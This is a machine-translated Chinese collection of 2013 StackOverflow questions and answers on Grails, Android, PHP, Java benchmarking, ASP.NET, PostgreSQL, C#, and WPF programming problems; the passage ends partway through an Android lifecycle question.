# StackOverflow 问答 14832000-14832999

# spring - @PostConstruct 在 Grails 服务上静默失败

> ID：14832002
> 
> 赞同：8
> 
> 时间：2013-02-12T11:55:33.527
> 
> 标签：spring, grails, annotations, postconstruct

我认为 Spring 注释应该在 Grails 环境中开箱即用，但我根本无法让它工作。我还尝试了 afterProperties 方法，它也不起作用。

任何人都可以发现错误吗？我需要做一些配置吗？

```
package dashboard

import javax.annotation.PostConstruct

class EmailJobSchedulerService
{
    def grailsApplication

    @PostConstruct
    def init() {
        def cronExpression = grailsApplication.config.emailAt8AmTrigger
        println(cronExpression)
        EmailSubscribersJob.schedule(cronExpression, new HashMap())
    }
} 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-12T12:02:28.937

尝试将其更改为

```
@PostConstruct
void init() { 
```

（即`void`代替`def`）。我不确定 Spring 是否专门强制执行此操作，但[规范中`@PostConstruct`](http://docs.oracle.com/javase/7/docs/api/javax/annotation/PostConstruct.html)指出“方法的返回类型必须为 void”。

编辑：uchamp 的评论是正确的，我只是尝试了相同的测试，并且确实`@PostConstruct`只在第一次使用服务 bean 时调用了带注释的方法，并且不一定在启动时立即调用。你可以加

```
static lazyInit = false 
```

到服务类以强制它在启动时急切地初始化。这似乎没有记录在用户指南中，我是通过[阅读代码推断出来的](https://github.com/grails/grails-core/blob/master/grails-plugin-services/src/main/groovy/org/codehaus/groovy/grails/plugins/services/ServicesGrailsPlugin.groovy#L65)。

请注意，上一段中的“使用”并不一定意味着您必须在其上调用方法。服务 bean 将在第一次从应用程序上下文中获取时被初始化，无论是直接还是因为它已自动装配到另一个正在初始化的 bean 中。例如，将服务注入 BootStrap 使用

```
def emailJobSchedulerService 
```

足以触发该`@PostConstruct`方法，您不必从`BootStrap.init`闭包中实际调用任何服务的方法。同样，如果您的服务被注入任何控制器，那么 init 将在其中一个控制器第一次处理请求时触发（任何请求，它不必是调用服务的操作）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-25T11:53:59.477

只需添加@Ian 的答案-出于某种原因，我有：

```
@PostConstruct
private void init() { 
```

这也默默地失败并给出了奇怪的行为。解决方案是删除“私人”：

```
@PostConstruct
void init() { 
```

# java - Android 应用程序中的持续崩溃

> ID：14832004
> 
> 赞同：0
> 
> 时间：2013-02-12T11:55:37.020
> 
> 标签：java, android, eclipse

每当我启动我的应用程序时，它都会崩溃。由于我过去在使用 RelativeLayout 时遇到了一些类似的问题，我猜这个问题与此有关。我使用图形界面创建了布局。

java 应用程序和布局都不会返回任何错误或重要警告。

**MainActivity.java**

```
package com.XXX.mcgneussapp2;

import android.app.Activity;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final ProgressBar Pbar = (ProgressBar) findViewById(R.id.pB1);
        final TextView loadtext = (TextView) findViewById(R.id.textView1);  
        final ImageView imgFavorite = (ImageView) findViewById(R.id.imageView2);
        final ImageView imgFavorite2 = (ImageView) findViewById(R.id.imageView3);
        final ImageView imgFavorite3 = (ImageView) findViewById(R.id.imageView4);

        WebView engine = (WebView) findViewById(R.id.web_engine);  
        engine.setWebViewClient(new WebViewClient() 
        {  
            @Override  
            public boolean shouldOverrideUrlLoading(WebView view, String url)  
            {  
              return false;  
            }  

            public void onPageStarted(WebView view, String url, Bitmap favicon)
            {
                view.setVisibility(View.GONE);
                Pbar.setVisibility(ProgressBar.VISIBLE);
                loadtext.setVisibility(View.VISIBLE);
            }

            public void onPageFinished (WebView view, String url)
            {
                view.setVisibility(View.VISIBLE);
                Pbar.setVisibility(ProgressBar.GONE);
                loadtext.setVisibility(View.GONE);
            }
        });          

        imgFavorite.setClickable(true);
        imgFavorite.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v)  //favoriten
            {
                WebView engine = (WebView) findViewById(R.id.web_engine);  
                engine.loadUrl("https://www.free-way.me/mcgapp/recommend.php");
                imgFavorite3.setVisibility(View.VISIBLE);
                imgFavorite2.setVisibility(View.VISIBLE);
            }
        });

        imgFavorite2.setClickable(true);
        imgFavorite2.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v)  //weiter
            {
                WebView engine = (WebView) findViewById(R.id.web_engine);  
                engine.loadUrl("https://www.free-way.me/mcgapp/index.php?siteid=1&nohead");
                imgFavorite3.setVisibility(View.VISIBLE);
                imgFavorite2.setVisibility(View.GONE);
            }
        });

        imgFavorite3.setClickable(true);
        imgFavorite3.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) //zurück
            {
                WebView engine = (WebView) findViewById(R.id.web_engine);  
                engine.loadUrl("https://www.free-way.me/mcgapp/index.php?nohead");
                imgFavorite3.setVisibility(View.GONE);
                imgFavorite2.setVisibility(View.VISIBLE);
            }
        });

        engine.getSettings().setJavaScriptEnabled(true);
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        engine.loadUrl("https://www.free-way.me/mcgapp/index.php?nohead");  
        imgFavorite3.setVisibility(View.GONE);

    }
} 
```

**activity_main.xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        tools:context=".MainActivity" >

        <ImageView
            android:id="@+id/imageView5"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_alignParentLeft="true"
            android:src="@android:drawable/bottom_bar" />

        <ImageView
            android:id="@+id/imageView2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_alignTop="@+id/imageView5"
            android:layout_centerHorizontal="true"
            android:clickable="true"
            android:src="@android:drawable/ic_menu_myplaces" />

        <ImageView
            android:id="@+id/imageView4"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_alignParentLeft="true"
            android:layout_alignTop="@+id/imageView5"
            android:layout_marginLeft="14dp"
            android:clickable="true"
            android:src="@android:drawable/ic_media_previous" />

        <ImageView
            android:id="@+id/imageView3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_alignParentRight="true"
            android:layout_alignTop="@+id/imageView5"
            android:layout_marginRight="14dp"
            android:clickable="true"
            android:src="@android:drawable/ic_media_next" />

        <TextView
            android:id="@+id/textView1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_above="@+id/pB1"
            android:layout_centerHorizontal="true"
            android:layout_marginBottom="24dp"
            android:text="Bitte warten"
            android:textAppearance="?android:attr/textAppearanceMedium"
            tools:ignore="HardcodedText" />

        <ProgressBar
            android:id="@+id/pB1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_centerHorizontal="true"
            android:layout_centerVertical="true" />

        <WebView
            android:id="@+id/web_engine"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:layout_above="@+id/imageView5"
            android:layout_alignParentLeft="true"
            android:layout_alignParentTop="true" />

    </RelativeLayout> 
```

**LogCat 转储**

```
 > 02-12 11:45:32.795: D/AndroidRuntime(309): Shutting down VM 02-12
    > 11:45:32.795: W/dalvikvm(309): threadid=1: thread exiting with
    > uncaught exception (group=0x4001d800) 02-12 11:45:32.805:
    > E/AndroidRuntime(309): FATAL EXCEPTION: main 02-12 11:45:32.805:
    > E/AndroidRuntime(309): java.lang.RuntimeException: Unable to start
    > activity
    > ComponentInfo{com.XXX.mcgneussapp2/com.XXX.mcgneussapp2.MainActivity}:
    > java.lang.ClassCastException: android.widget.ImageView 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > android.app.ActivityThread.access$2300(ActivityThread.java:125) 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > android.os.Handler.dispatchMessage(Handler.java:99) 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > android.os.Looper.loop(Looper.java:123) 02-12 11:45:32.805:
    > E/AndroidRuntime(309):    at
    > android.app.ActivityThread.main(ActivityThread.java:4627) 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > java.lang.reflect.Method.invokeNative(Native Method) 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > java.lang.reflect.Method.invoke(Method.java:521) 02-12 11:45:32.805:
    > E/AndroidRuntime(309):    at
    > com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626) 02-12
    > 11:45:32.805: E/AndroidRuntime(309):  at
    > dalvik.system.NativeStart.main(Native Method) 02-12 11:45:32.805:
    > E/AndroidRuntime(309): Caused by: java.lang.ClassCastException:
    > android.widget.ImageView 02-12 11:45:32.805: E/AndroidRuntime(309):
    >   at
    > com.XXX.mcgneussapp2.MainActivity.onCreate(MainActivity.java:24)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    at
    > android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
    > 02-12 11:45:32.805: E/AndroidRuntime(309):    ... 11 more 02-12
    > 11:45:35.784: I/Process(309): Sending signal. PID: 309 SIG: 9 02-12
    > 11:46:26.815: D/AndroidRuntime(343): Shutting down VM 02-12
    > 11:46:26.815: W/dalvikvm(343): threadid=1: thread exiting with
    > uncaught exception (group=0x4001d800) 02-12 11:46:26.825:
    > E/AndroidRuntime(343): FATAL EXCEPTION: main 02-12 11:46:26.825:
    > E/AndroidRuntime(343): java.lang.RuntimeException: Unable to start
    > activity
    > ComponentInfo{com.XXX.mcgneussapp2/com.XXX.mcgneussapp2.MainActivity}:
    > java.lang.ClassCastException: android.widget.ImageView 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > android.app.ActivityThread.access$2300(ActivityThread.java:125) 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > android.os.Handler.dispatchMessage(Handler.java:99) 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > android.os.Looper.loop(Looper.java:123) 02-12 11:46:26.825:
    > E/AndroidRuntime(343):    at
    > android.app.ActivityThread.main(ActivityThread.java:4627) 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > java.lang.reflect.Method.invokeNative(Native Method) 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > java.lang.reflect.Method.invoke(Method.java:521) 02-12 11:46:26.825:
    > E/AndroidRuntime(343):    at
    > com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626) 02-12
    > 11:46:26.825: E/AndroidRuntime(343):  at
    > dalvik.system.NativeStart.main(Native Method) 02-12 11:46:26.825:
    > E/AndroidRuntime(343): Caused by: java.lang.ClassCastException:
    > android.widget.ImageView 02-12 11:46:26.825: E/AndroidRuntime(343):
    >   at
    > com.XXX.mcgneussapp2.MainActivity.onCreate(MainActivity.java:24)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    at
    > android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
    > 02-12 11:46:26.825: E/AndroidRuntime(343):    ... 11 more 
```

//编辑： **AndroidManifest.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.XXX.mcgneussapp2"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name="com.XXX.mcgneussapp2.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T14:05:14.337

您的代码在这里运行良好。尝试清理您的项目并重建，正如 AA 在评论中建议的那样。

# php - PHP比较字符串是否（几乎）相等

> ID：14832005
> 
> 赞同：3
> 
> 时间：2013-02-12T11:55:39.667
> 
> 标签：php

我需要比较可以用多种方式编写的名称。例如，像 St. Thomas 这样的名字有时写成 St-Thomas 或 Sant Thomas。最好，我希望构建一个函数，该函数可以为比较提供一定百分比的“平等”，就像一些论坛一样（例如，*这篇文章被编辑了 5%*）。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-12T11:59:26.643

PHP 有两个（主要的）内置函数。

[`levenshtein`](http://php.net/manual/en/function.levenshtein.php)它计算从 string1 生成 string2 需要多少更改（删除/添加/替换）。（越低越好）

和

[`similar_text`](http://www.php.net/manual/en/function.similar-text.php)它返回匹配字符的数量（越高越好）。请注意，您可以将引用作为第三个参数传递，它会给您一个百分比。

```
<?php
    $originalPost = "Here's my question to stack overflou. Thanks /h2ooooooo";
    $editedPost = "Question to stack overflow.";
    $matchingCharacters = similar_text($originalPost, $editedPost, $matchingPercentage);
    var_dump($matchingCharacters); //int(25) 
    var_dump($matchingPercentage); //float(60.975609756098) (hence edited 40%)
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T12:02:31.633

两个字符串之间的编辑距离一般是指Levenshtein距离。

[http://php.net/manual/en/function.levenshtein.php](http://php.net/manual/en/function.levenshtein.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:04:02.957

```
$v1 = 'pupil';
$v2 = 'people';
# TRUE if $v1 & $v2 have similar  pronunciation
soundex($v1) == soundex($v2);  
# Same but it use a more accurate comparison algorithm                 
metaphone($v1) == metaphone($v2);               
# Calculate how many common characters between 2 strings
# Percent store the percentage of common chars
$common = similar_text($v1, $v2, $percent);     
# Compute the difference of 2 text                                                 
$diff = levenshtein($v1, $v2); 
```

所以，要么`levenshtein($v1, $v2)`或`similar_text($v1, $v2, $percent)`将为你做这件事，但仍然有**权衡**。该`levenshtein()`算法的复杂性是`O(m*n)`，其中 n 和 m 是 v1 和 v2 的长度（与 相比相当好`similar_text()`，即`O(max(n,m)**3)`，但仍然很昂贵）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:00:41.697

查看`levenshtein()`，它可以满足您的需求并且相对高效（但不是非常高效）： [http ://www.php.net/manual/en/function.levenshtein.php](http://www.php.net/manual/en/function.levenshtein.php)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:02:13.320

您可以使用不同的方法。

您可以使用该`similar_text()`功能来检查相似性。

或者

您可以使用`levenshtein()`函数来找出...

> Levenshtein 距离定义为您必须替换、插入或删除以将 str1 转换为 str2 的最少字符数

然后检查您的检查的合理阈值。

# java - 为什么方法访问似乎比字段访问更快？

> ID：14832007
> 
> 赞同：6
> 
> 时间：2013-02-12T11:55:42.177
> 
> 标签：java, optimization, benchmarking

我正在做一些测试，以了解使用 getter/setter 和直接字段访问之间的速度差异。我写了一个简单的基准测试应用程序，如下所示：

```
public class FieldTest {

    private int value = 0;

    public void setValue(int value) {
        this.value = value;
    }

    public int getValue() {
        return this.value;
    }

    public static void doTest(int num) {
        FieldTest f = new FieldTest();

        // test direct field access
        long start1 = System.nanoTime();

        for (int i = 0; i < num; i++) {
            f.value = f.value + 1;
        }
        f.value = 0;

        long diff1 = System.nanoTime() - start1;

        // test method field access
        long start2 = System.nanoTime();

        for (int i = 0; i < num; i++) {
            f.setValue(f.getValue() + 1);
        }
        f.setValue(0);

        long diff2 = System.nanoTime() - start2;

        // print results
        System.out.printf("Field Access:  %d ns\n", diff1);
        System.out.printf("Method Access: %d ns\n", diff2);
        System.out.println();
    }

    public static void main(String[] args) throws InterruptedException {
        int num = 2147483647;

        // wait for the VM to warm up
        Thread.sleep(1000);

        for (int i = 0; i < 10; i++) {
            doTest(num);
        }
    }

} 
```

每当我运行它时，我都会得到一致的结果，例如： http: [//pastebin.com/hcAtjVCL](http://pastebin.com/hcAtjVCL)

我想知道是否有人可以向我解释为什么字段访问似乎比 getter/setter 方法访问慢，以及为什么最后 8 次迭代执行得非常快。

* * *

**编辑**：考虑到`assylias`和`Stephen C`评论后，我将代码更改为[http://pastebin.com/Vzb8hGdc](http://pastebin.com/Vzb8hGdc)，结果略有不同：http: [//pastebin.com/wxiDdRix](http://pastebin.com/wxiDdRix)。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-12T12:04:09.507

解释是你的基准被打破了。

第一次迭代是使用解释器完成的。

```
Field Access:  1528500478 ns
Method Access: 1521365905 ns 
```

第二次迭代由解释器开始，然后我们转向运行 JIT 编译的代码。

```
Field Access:  1550385619 ns
Method Access: 47761359 ns 
```

其余的迭代都是使用 JIT 编译的代码完成的。

```
Field Access:  68 ns
Method Access: 33 ns

etcetera 
```

它们快得*令人难以置信的原因是 JIT 编译器已经***优化了循环**。它检测到它们没有对计算做出任何有用的贡献。（不清楚为什么第一个数字似乎总是比第二个更快，但我怀疑优化的代码是否以任何有意义的方式测量字段与方法访问。）

* * *

重新**更新**代码/结果：很明显，JIT 编译器仍在优化循环。

# c# - VS2008 调试旧的 ASP.NET web 服务

> ID：14832009
> 
> 赞同：0
> 
> 时间：2013-02-12T11:55:55.533
> 
> 标签：c#, asp.net, visual-studio

我正在用 C# 编写一个 ASP.NET Web 服务。在昨天之前，如果我想调试它，我只需按 F5，ASP.NET 开发服务器就会开始托管我的服务。断点将被启用并且可以工作。最近这个功能消失了。现在，当我开始调试时，开发服务器已启动，但托管了旧版本的 Web 服务，并且断点不起作用。我收到版本不匹配的警告。

如果我重新构建所有内容，或者更改程序集版本，甚至更改 DLL 的文件名，这都无济于事。**如果我删除整个临时文件夹也无济于事`%TEMP%\Temporary ASP.NET Files`**。旧的 web 服务将从谁知道在哪里被拉出，并再次存储在 temp 文件夹中。

昨天之前的主要变化是我安装了 IIS。安装在那里的 Web 服务按预期工作，但我也需要调试它。我认为问题在于我安装了 Web 服务（使用 vdproj），所以我卸载了它，但这也没有帮助。

如何防止系统缓存旧版本的 Web 服务。无论如何，这个旧版本存储在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:10:14.870

检查 ASP.NET 项目的 Web 设置。要返回使用 ASP.NET 开发服务器进行 F5 调试，请确保在“服务器”标题下选中“使用 Visual Studio 开发服务器”单选按钮。我还指定了一个特定端口，以便我的解决方案中的其他项目可以一致地引用它（在我的情况下，我正在处理一个 Web 服务）。您很有可能会发现“用户本地 IIS Web 服务器”单选按钮被选中。

希望有帮助。

编辑：这里的问题不是关于 IIS，而是关于更改 Web 服务的目标构建输出文件夹。必须是`bin\`，否则开发服务器找不到它。重建没有帮助，因为它会更改新文件夹中的 dll 文件，但旧文件将在 bin 文件夹中保持不受干扰。

# sql - 优化查询以从不同的表中获取唯一（用户）记录

> ID：14832023
> 
> 赞同：1
> 
> 时间：2013-02-12T11:56:32.113
> 
> 标签：sql, ruby-on-rails, postgresql, query-optimization

我已经让这个查询运行得很好，但问题是当我的 4 个表变得太大时，它会变得很慢。

我该如何优化呢？

```
SELECT 
    all_records.user_id,
    users.NAME,
    users.IMAGE
FROM (
    SELECT user_id FROM comments
    WHERE commentable_id   = #{object.id}
      AND commentable_type = '#{object.class.to_s}'
    UNION ALL
    SELECT user_id FROM hello
    WHERE helloable_id     = #{object.id}
      AND helloable_type   = '#{object.class.to_s}'
    UNION ALL
    SELECT user_id FROM foo
    WHERE fooable_id       = #{object.id}
      AND fooable_type     = '#{object.class.to_s}'
    UNION ALL
    SELECT user_id FROM bar
    WHERE barable_id       = #{object.id}
      AND barable_type     = '#{object.class.to_s}'
) AS all_records
INNER JOIN users ON users.id = all_records.user_id
GROUP BY
    all_records.user_id,
    users.NAME,
    users.IMAGE
LIMIT 15 
```

查询应该做的是获取在 (4) 表上执行某些操作的唯一用户（请原谅表名称的更改）。即使使用`LIMIT 15`它仍然运行缓慢，因为我认为它仍然可以读取所有 4 个表。我这样做是对的还是有什么方法可以优化它？

供参考：我正在使用 postgres 并使用 rails 但在`find_by_sql`.

**编辑**

本地 postgres：9.0.5；heroku postgres：9.1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T14:53:12.897

照原样回答您的问题：“获取 15 行任意行”。那应该*非常*快。

```
SELECT u.id, u.name, u.image
FROM  (
   SELECT id
   FROM  (
      SELECT user_id AS id
      FROM   comments
      WHERE  commentable_id   = #{object.id}
      AND    commentable_type = '#{object.class.to_s}'

      UNION ALL
      SELECT user_id
      FROM   hello
      WHERE  helloable_id   = #{object.id}
      AND    helloable_type = '#{object.class.to_s}'

      UNION ALL
      SELECT user_id
      FROM   foo
      WHERE  fooable_id     = #{object.id}
      AND    fooable_type   = '#{object.class.to_s}'

      UNION ALL
      SELECT user_id
      FROM   bar
      WHERE  barable_id     = #{object.id}
      AND    barable_type   = '#{object.class.to_s}'
      ) AS a
   GROUP  BY id
   LIMIT  15
   ) b
JOIN   users u USING (id) 
```

*   如果您正在运行 PostgreSQL 9.1 或更高版本，则可以简化为`GROUP BY id`，假设`users.id`是主键。但我采取了更激进的方法。

*   我调高了`GROUP BY`一个`LIMIT`查询级别，希望能够对基表进行更快的索引扫描。`LIMIT 15`不`ORDER BY`应该发生顺序扫描。Postgres 可以从索引顶部读取元组，并在达到限制后立即停止。
    与此密切相关的案例类似：[在结果可用之前尝试多个 SELECT 的方法？](https://stackoverflow.com/questions/14339715/way-to-try-multiple-selects-till-a-result-is-available/14365613#14365613)
    只有在这里 Postgres 从索引中读取元组。

*   您`might`可以通过使用`LEFT JOIN users`而不是`JOIN`（而不是我的额外子查询级别）来实现相同的效果，因为它`JOIN`可能会从结果中删除行并禁用更简单的查询计划。

*   为了获得完美的性能，你有像这样的索引

    ```
    CREATE INDEX comments_mult_idx
    ON comments (commentable_id, commentable_type, user_id) 
    ```

    在所有 4 张桌子上。`user_id`必须是最后一列。[这就是为什么](https://dba.stackexchange.com/questions/6115/working-of-indexes-in-postgresql/7484#7484)。

# web-applications - Web应用程序可以获取用户保存的文件位置吗

> ID：14832025
> 
> 赞同：0
> 
> 时间：2013-02-12T11:56:36.137
> 
> 标签：web-applications

我有一个 Web 应用程序，可以让用户在新窗口中打开 pdf 文件。

打开窗口时，它会询问用户是否要保存/打开文件。

我需要知道用户保存 pdf 的位置，有没有办法让应用程序知道这个保存的文件路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:01:52.850

不会。文件在单独的请求中返回，浏览器会处理文件的保存。无法拦截此操作或让浏览器报告结果。

例如，假设用户取消了保存。浏览器如何知道将这些信息告诉您的 Web 应用程序？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:02:26.053

从 Web 服务器上，您将无法读取用户保存文件的位置（也无法读取他是否保存了文件）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:02:43.083

无法通过 Web 浏览器访问客户端文件系统。

浏览器充当服务器（可能不值得信任）和客户端（可能不希望其私人信息公开的用户）之间的屏障。

不可能而且必须没有办法让它起作用，而且永远不会（或者至少应该这样做，因为它会暴露客户端数据，例如可以用来准确猜测用户操作系统，这会导致他容易受到自动攻击）。

# c# - 编译错误 - 成员已定义

> ID：14832031
> 
> 赞同：0
> 
> 时间：2013-02-12T11:57:04.220
> 
> 标签：c#, .net

帮助并澄清我......为什么会发生错误？

```
class Program
{
    static void Main(string[] args)
    {       

    }

    public int GetNames(int id)
    {
        return id;
    }

    public float GetNames(int id)
    {
        return (float)id;
    }

    public String GetNames(string id)
    {
        return id;
    }
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-12T11:58:05.200

您不能拥有具有相同签名的方法。返回值不是方法签名的一部分。由方法名称和输入参数定义的签名。因此，您有两种具有相同签名的方法：

```
GetNames(int) 
```

请参阅msdn 上的[方法](http://msdn.microsoft.com/en-us/library/ms173114%28v=vs.110%29.aspx)文章

> 出于方法重载的目的，方法的返回类型不是方法签名的一部分。

解决方案 - 使签名不同（重命名方法、更改方法的参数类型或更改参数编号）

# wpf - WPF命中测试矩形区域

> ID：14832037
> 
> 赞同：3
> 
> 时间：2013-02-12T11:57:39.113
> 
> 标签：wpf

我有一个 WrapPanel 包含任意数量的锯齿状大小的元素。我想为我的项目实现拖动选择。

如何对一个点进行 HitTest 似乎很明显，但是如何找到矩形区域内的所有项目？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T12:24:40.660

您可以将[VisualTreeHelper.HitTest](http://msdn.microsoft.com/en-us/library/ms608753.aspx)与[GeometryHitTestParameters](http://msdn.microsoft.com/en-us/library/system.windows.media.geometryhittestparameters.aspx)参数和[HitTestFilterCallback 一起](http://msdn.microsoft.com/en-us/library/system.windows.media.hittestfiltercallback.aspx)使用，以检查 Visual 是否是 Panel 的直接子级。

像这样的东西：

```
var selectedElements = new List<DependencyObject>();

var rect = new RectangleGeometry(...);
var hitTestParams = new GeometryHitTestParameters(rect);

var resultCallback = new HitTestResultCallback(
    result => HitTestResultBehavior.Continue);

var filterCallback = new HitTestFilterCallback(
    element =>
    {
        if (VisualTreeHelper.GetParent(element) == panel)
        {
            selectedElements.Add(element);
        }
        return HitTestFilterBehavior.Continue;
    });

VisualTreeHelper.HitTest(
    panel, filterCallback, resultCallback, hitTestParams); 
```

* * *

它看起来有点复杂，但`HitTestFilterCallback`有必要在视觉树中获取所有视觉对象，而不仅仅是那些实际被击中的对象。例如，如果您的面板包含 Label 控件，`HitTestResultCallback`则只会为每个 Label 的 Border 和 TextBlock 子 Visuals 调用。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-12T12:17:32.323

用于控制命中测试可见性的选项是`IsHitTestVisible`属性。无论使用哪个画笔呈现 UIElement，此属性都允许您控制命中测试可见性。

此外，您想将填充设置为透明

```
 <Rectangle  Width="200" Height="200" Margin="170,23,12,35" Fill="Transparent" IsHitTestVisible="True"   /> 
```

# android - onWindowFocusChanged() 不调用 false，只有 true

> ID：14832042
> 
> 赞同：3
> 
> 时间：2013-02-12T11:57:50.683
> 
> 标签：android, android-lifecycle

我的游戏在设备显示在锁定屏幕上时播放声音时遇到问题，就像[那里](http://android-developers.blogspot.co.uk/2011/11/making-android-games-that-play-nice.html)讨论的那样。由于某些原因，我不能要求用户输入来恢复游戏，所以我想捕捉 onWindowFocusChanged 事件以恢复游戏。不幸的是，描述的解决方案在我的情况下不起作用。

应用程序使用横向。AndroidManifest.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
  package="com.application.applicationname"
  android:versionCode="1"
  android:versionName="1.0">

<supports-screens android:smallScreens="true"
    android:normalScreens="true"
    android:largeScreens="true"
    android:xlargeScreens="true"/>

<uses-sdk android:minSdkVersion="10" android:targetSdkVersion="16"/>

<application android:label="@string/app_name"
    android:debuggable="true"
    android:icon="@drawable/icon">

    <!-- main application activity -->
    <activity android:name="com.application.applicationname.Activity"
              android:label="@string/app_name"
              android:screenOrientation="landscape"
              android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
              android:configChanges="orientation">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>
</manifest> 
```

当我使用纵向的手机时，出现了问题。一开始一切都很好。简单日志：

```
02-12 18:18:28.329: E/activity(15215): onDestroy called
02-12 18:18:28.329: E/activity(15215): onCreate called
02-12 18:18:28.389: E/activity(15215): onStart called
02-12 18:18:28.389: D/activity(15215): onResumeCalled
02-12 18:19:06.329: D/activity(15215): onWindowFocusChanged called with focus = true 
```

但是当我按下电源按钮锁定设备然后解锁时：

```
02-12 18:30:55.629: E/activity(22605): onPause called
02-12 18:30:55.629: E/activity(22605): onStop called
02-12 18:30:58.379: E/activity(22605): onDestroy called
02-12 18:30:58.839: E/activity(22605): onCreate called
02-12 18:30:58.839: E/activity(22605): onStart called
02-12 18:30:58.839: D/activity(22605): onResumeCalled
02-12 18:30:58.849: D/activity(22605): onPauseCalled
02-12 18:30:59.219: D/activity(22605): onResumeCalled
02-12 18:30:59.479: D/activity(22605): onPauseCalled
02-12 18:30:59.559: E/activity(22605): onStop called
02-12 18:34:01.899: E/activity(22605): onRestart called
